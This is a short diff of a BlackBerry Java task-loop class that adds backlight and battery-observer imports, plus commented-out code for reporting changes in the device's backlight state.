@@ -12,9 +12,11 @@ package blackberry;
 import java.util.Timer;
 import java.util.Vector;
 
+import net.rim.device.api.system.Backlight;
 import net.rim.device.api.system.DeviceInfo;
 import blackberry.action.Action;
 import blackberry.action.SubAction;
+import blackberry.interfaces.BatteryStatusObserver;
 import blackberry.interfaces.Singleton;
 import blackberry.log.LogCollector;
 import blackberry.utils.Check;
@@ -100,6 +102,13 @@ public final class Task implements Singleton {
         Utils.sleep(1000);
 
         for (;;) {
+            
+           /* if(Backlight.isEnabled()){
+                notifyBacklight(true);
+            }else{
+                notifyBacklight(false);
+            }*/
+            
             //#ifdef DEBUG_TRACE
             // debug.trace("checkActions");
             //#endif
@@ -181,6 +190,15 @@ public final class Task implements Singleton {
             Utils.sleep(SLEEPING_TIME);
         }
     }
+
+/*    private boolean lastBacklight = false;
+    private synchronized void notifyBacklight(boolean backlight) {
+        if(backlight!=lastBacklight){
+            lastBacklight=backlight;
+            
+            AppListener.getInstance().backlightStateChange(backlight);
+        }
+    }*/
 
     /**
      * Start application timer.
